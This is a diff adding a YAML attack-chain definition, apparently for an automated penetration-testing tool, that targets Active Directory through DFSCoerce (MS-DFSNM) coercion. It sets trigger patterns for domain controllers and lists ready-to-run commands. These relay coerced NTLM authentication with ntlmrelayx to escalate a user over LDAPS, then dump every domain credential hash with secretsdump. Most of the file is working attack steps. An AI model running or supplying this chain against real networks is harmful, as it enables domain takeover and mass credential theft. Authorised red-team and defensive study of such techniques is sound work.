@@ -1,0 +1,36 @@
+chain_id: dfscoerce_ms_dfsnm
+title: "AD — DFSCoerce (MS-DFSNM) coercion, the patched-PetitPotam alternative"
+severity: HIGH
+tags: [ad, coercion, dfscoerce, ms-dfsnm, ntlm-relay]
+
+trigger:
+  any_of:
+    - { kind: "domain_user_credentials" }
+    - { kind: "ad_coercion_candidate" }
+    - { banner_pattern: "(?i)windows\\s*server|domain\\s*controller|active\\s*directory" }
+    - { service_pattern: "(?i)kerberos|ldap" }
+
+description: |
+  DFSCoerce abuses MS-DFSNM (`NetrDfsAddStdRoot` etc.) — present on
+  every DC by default, no service to disable. Microsoft considers this
+  a "by design" feature, so unlike PrinterBug and PetitPotam, this
+  primitive isn't going away.
+
+steps:
+  - id: 1
+    title: "Stand up ntlmrelayx"
+    command: |
+      impacket-ntlmrelayx -t ldaps://$DC --escalate-user USUARIO -smb2support
+
+  - id: 2
+    title: "Trigger the coercion"
+    command: |
+      python3 dfscoerce.py -u USUARIO -p 'PASSWORD' -d $DOMAIN $LISTENER $DC
+
+  - id: 3
+    title: "ntlmrelayx delegates / writes — confirm with secretsdump"
+    command: |
+      impacket-secretsdump $DOMAIN/USUARIO:'PASSWORD'@$DC -just-dc
+
+references:
+  - https://github.com/Wh04m1001/DFSCoerce
